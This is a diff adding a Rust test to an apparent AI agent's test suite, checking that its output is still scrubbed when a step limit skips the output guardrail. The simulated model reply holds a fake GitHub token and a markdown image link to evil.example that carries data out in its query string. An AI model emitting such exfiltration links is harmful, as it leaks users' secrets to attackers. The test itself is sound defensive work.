@@ -422,6 +422,19 @@ async fn output_secrets_and_image_exfil_are_scrubbed() {
     assert!(!r.answer.contains("stolen"));
 }
 
+#[tokio::test]
+async fn step_budget_exit_still_guards_the_answer() {
+    // max_steps = 5 ends the walk right after local_llm, so the graph jumps
+    // to the sink and skips the guardrail_output node.
+    const FAKE: &str = concat!("ghp_", "abcdefghijklmnopqrstuvwxyz", "0123456789");
+    let reply = format!("key {FAKE} ![x](https://evil.example/a.png?d=stolen)");
+    let h = harness(vec![text_reply(&reply)], |c| c.agent.max_steps = 5).await;
+    let r = h.agent.run(req("hi", Origin::Cli, Arc::new(DenyAll))).await;
+    assert!(r.path.contains(&"local_llm") && !r.path.contains(&"guardrail_output"));
+    assert!(!r.answer.contains(FAKE));
+    assert!(!r.answer.contains("stolen"));
+}
+
 // ------------------------------------------------------------- tool gate
 
 #[tokio::test]
